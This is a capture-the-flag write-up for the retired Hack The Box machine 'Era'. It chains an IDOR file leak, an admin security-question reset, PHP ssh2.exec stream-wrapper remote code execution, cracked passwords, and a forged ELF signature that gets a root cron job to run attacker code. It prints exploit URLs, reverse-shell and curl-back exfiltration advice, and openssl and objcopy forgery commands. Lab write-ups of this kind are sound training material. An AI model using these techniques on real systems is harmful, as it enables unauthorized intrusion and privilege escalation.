# Era — Hack The Box, Medium, Linux

*Machine status: retired. Flags shown are from my own run — strip them before publishing anywhere.*

Era is a chain about *reading before writing*: an insecure direct object
reference hands you the application's own source code and secrets, and every
later step is already written in those files. The foothold is a PHP stream-wrapper
RCE, and root is a signed-binary trick where the signing key was in the loot the
whole time.

## Recon

Two ports: `21/tcp` (vsftpd 3.0.5) and `80/tcp` (nginx). Anonymous FTP is refused.
The web root on the raw IP `302`s to `http://era.htb/`, so the box is vhost-gated.
`era.htb` itself is a static design-agency template with nothing behind it.

Fuzzing virtual hosts (a 20k list, auto-calibrated) surfaces a second name:

```
file.era.htb
```

This is "Era Storage", a small PHP file-sharing app with a login, an **open
registration** (`register.php`), uploads, a manage page, and two login methods:
password and **security questions** (`security_login.php`).

## IDOR → the source code falls out

Register, log in, upload a file. The manage page links each file as
`download.php?id=<N>`, and the id is a small integer. `download.php` never checks
who owns the file — it looks the file up by id alone. Sweeping ids below my own
returns two files that are not mine:

```
id 54  → site-backup-30-08-24.zip
id 150 → signing.zip
```

The backup is the **entire application source plus `filedb.sqlite`**. That one
unauthorized download decides the whole box. `signing.zip` holds `key.pem` and
`x509.genkey` — keep those for later.

The database:

```
admin_ef01cab31aa  (uid 1)  bcrypt   answers: Maria / Oliver / Ottawa
eric, veronica, yuri, john, ethan     bcrypt
```

## Becoming admin without a password

Reading `reset.php` and `security_login.php` together is the bug:

- `reset.php` runs `UPDATE users SET security_answer1..3 WHERE user_name = ?`
  with an **attacker-supplied username** and no ownership check.
- `security_login.php` logs you in as that user if the three answers match and
  sets `$_SESSION['erauser'] = user_id`.

So from any registered session I set `admin_ef01cab31aa`'s answers to values I
choose, then log in with them. I am now `erauser = 1`.

## Foothold: PHP stream-wrapper RCE

`download.php` has an admin-only "showcase" branch:

```php
$format = $_GET['format'] ?? '';
if (strpos($format, '://') !== false) { $wrapper = $format; ... }
$file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');
```

`$format` becomes a PHP **stream wrapper**, verbatim. The `php-ssh2` extension is
installed (a probe to a listener returns `SSH-2.0-libssh2_1.10.0 PHP`) and
outbound connections work, so:

```
download.php?id=54&show=true&format=ssh2.exec://<user>:<pass>@127.0.0.1:22/<cmd>
```

runs `<cmd>` on the host as `<user>`. I need a real local credential. The leaked
bcrypts crack instantly against `rockyou`:

```
eric : america
yuri : mustang
```

`eric`'s database password is also his **system** password. A reverse shell
through `ssh2.exec://eric:america@127.0.0.1:22/...` lands as `eric` (groups
`eric`, `devs`) and reads `user.txt`.

> Delivery note: the showcase branch only echoes a resource handle, not output,
> so it is a blind sink. Because the wrapper appends the stored file path to the
> command, end the command with `;#` so the trailing path is commented out. A
> `curl`-back to an HTTP sink gives a clean, egress-based scriptable channel
> without fighting the nc TTY.

## Root: a signed binary whose key you already have

Enumerating as `eric`, `/opt/AV` is `root:devs 0774` — and `eric ∈ devs`. A
quick `/proc` scan (pspy-style) catches a root cron every ~2 minutes:

```
/bin/sh -c bash -c '/root/initiate_monitoring.sh' >> /opt/AV/periodic-checks/status.log
/opt/AV/periodic-checks/monitor
```

`/root/initiate_monitoring.sh` runs `/opt/AV/periodic-checks/monitor` **as root**.
Replacing the binary with an unsigned one logs the mechanism itself:

```
objcopy: /opt/AV/periodic-checks/monitor: can't dump section '.text_sig' ...
[ERROR] Executable not signed. Tampering attempt detected. Skipping.
```

So the verifier extracts a `.text_sig` section and checks a signature before
executing. Capturing the legitimate binary and testing against its own
certificate shows exactly what is signed — **a PKCS#7 detached signature over the
ELF's `.text` section**:

```
objcopy -O binary --only-section=.text monitor monitor.text
openssl smime -verify -binary -inform DER -in .text_sig \
  -content monitor.text -certfile cert.pem -CAfile cert.pem -noverify
→ Verification successful
```

The certificate's CN is literally **"ELF verification"**, O "Era Inc." — and the
matching **private key is `key.pem` from `signing.zip`** (the file 150 IDOR). So I
can forge a valid signature:

1. Compile a small ELF whose `main()` drops a root shell and reads `root.txt`.
2. `objcopy -O binary --only-section=.text mal mal.text`
3. `openssl smime -sign -binary -in mal.text -signer cert.pem -inkey key.pem -outform DER -nocerts -out mal.sig`
4. `objcopy --add-section .text_sig=mal.sig --set-section-flags .text_sig=noload,readonly mal mal.signed`
5. `cat mal.signed > /opt/AV/periodic-checks/monitor` (group-writable)

Two minutes later the cron verifies my signature, runs the binary as root, and
`root.txt` plus a SUID root shell appear. Root.

## Leads that did not pan out / notes

- The `backup.service` systemd unit (`/root/backup_passwd.sh`) is present but
  failing (status 127); it is not the monitor scheduler. The monitor cron is a
  separate root job — confirmed only by watching `/proc`, not by reading `/root`.
- `yuri:mustang` cracked too but was not needed; `eric` was the intended account.
- `/srv/ftp` holds Apache/PHP config backups — a distraction, not a path.

## Defensive takeaway

One fix kills the whole chain: **authorize `download.php` by owner**. No leaked
backup means no source, no password hashes, no security answers, and no signing
key — and with no signing key the root step is impossible. Reading beats writing:
the box is solved by downloading two files and reading the code they contain.
